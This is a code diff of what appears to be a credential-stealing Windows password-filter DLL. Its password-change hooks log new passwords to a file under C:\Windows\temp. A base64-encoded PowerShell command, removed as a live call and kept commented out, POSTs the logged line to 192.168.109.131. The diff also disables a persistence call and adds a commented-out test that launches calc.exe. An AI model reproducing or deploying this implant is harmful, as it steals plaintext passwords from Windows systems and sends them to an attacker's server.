@@ -78,7 +78,7 @@ NTSTATUS catUTF16LEStr(
 BOOL writeToFile(PUNICODE_STRING text) {
     //open a file (the janky windows way)
     HANDLE hFile = CreateFileW(
-            L"C:\\Windows\\temp\\lsass.log",
+            L"C:\\Windows\\temp\\lsass2.log",
             FILE_APPEND_DATA,
             FILE_SHARE_READ,
             NULL,
@@ -150,7 +150,7 @@ extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void) 
 //return FALSE to deny change, TRUE to accept
 //this function being called does not mean the change was successful
 extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING uname, PUNICODE_STRING legalName, PUNICODE_STRING password, BOOLEAN SetOperation){
-    justPersistenceThings();
+//    justPersistenceThings();
     return TRUE; //not going to actually prevent password changes right now
 }
 
@@ -170,7 +170,30 @@ extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(PUNICOD
     writeToFile(&newline);
 
     //call the other executable for networking
-    system(R"("powershell.exe -EncodedCommand "JABmAGkAbABlAFAAYQB0AGgAIAA9ACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAGwAcwBhAHMAcwAuAGwAbwBnACIAOwAkAHMAZQByAHYAZQByAFUAcgBsACAAPQAgACIAMQA5ADIALgAxADYAOAAuADEAMAA5AC4AMQAzADEALwBwAG8AcwB0ACIAOwAkAGwAYQBzAHQATABpAG4AZQAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAFAAYQB0AGgAIAAkAGYAaQBsAGUAUABhAHQAaAAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBMAGEAcwB0ACAAMQA7AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAkAHMAZQByAHYAZQByAFUAcgBsACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAEIAbwBkAHkAIAAkAGwAYQBzAHQATABpAG4AZQAgAC0AQwBvAG4AdABlAG4AdABUAHkAcABlACAAIgB0AGUAeAB0AC8AcABsAGEAaQBuADsAIABjAGgAYQByAHMAZQB0AD0AdQB0AGYALQAxADYAbABlACIACgA=")");
+//    system("powershell.exe -EncodedCommand JABmAGkAbABlAFAAYQB0AGgAIAA9ACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAGwAcwBhAHMAcwAuAGwAbwBnACIAOwAkAHMAZQByAHYAZQByAFUAcgBsACAAPQAgACIAMQA5ADIALgAxADYAOAAuADEAMAA5AC4AMQAzADEALwBwAG8AcwB0ACIAOwAkAGwAYQBzAHQATABpAG4AZQAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAFAAYQB0AGgAIAAkAGYAaQBsAGUAUABhAHQAaAAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBMAGEAcwB0ACAAMQA7AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAkAHMAZQByAHYAZQByAFUAcgBsACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAEIAbwBkAHkAIAAkAGwAYQBzAHQATABpAG4AZQAgAC0AQwBvAG4AdABlAG4AdABUAHkAcABlACAAIgB0AGUAeAB0AC8AcABsAGEAaQBuADsAIABjAGgAYQByAHMAZQB0AD0AdQB0AGYALQAxADYAbABlACIACgA=");
+//    STARTUPINFO startupInfo;
+//    PROCESS_INFORMATION processInfo;
+//    ZeroMemory(&startupInfo, sizeof(startupInfo));
+//    startupInfo.cb = sizeof(startupInfo);
+//    ZeroMemory(&processInfo, sizeof(processInfo));
+//    const char* executablePath = "C:\\Windows\\System32\\calc.exe";
+//    CreateProcess(
+//            executablePath,     // Path to the executable
+//            NULL,               // Command line arguments (optional)
+//            NULL,               // Process handle not inheritable
+//            NULL,               // Thread handle not inheritable
+//            FALSE,              // Set handle inheritance to FALSE
+//            0,                  // No creation flags
+//            NULL,               // Use parent's environment block
+//            NULL,               // Use parent's starting directory
+//            &startupInfo,       // Pointer to STARTUPINFO structure
+//            &processInfo  // Pointer to PROCESS_INFORMATION structure
+//    );
+//
+//    WaitForSingleObject(processInfo.hProcess, 30000);
+//
+//    CloseHandle(processInfo.hProcess);
+//    CloseHandle(processInfo.hThread);
 
     //above blob is this script
     //$filePath = "C:\Windows\Temp\lsass.log"
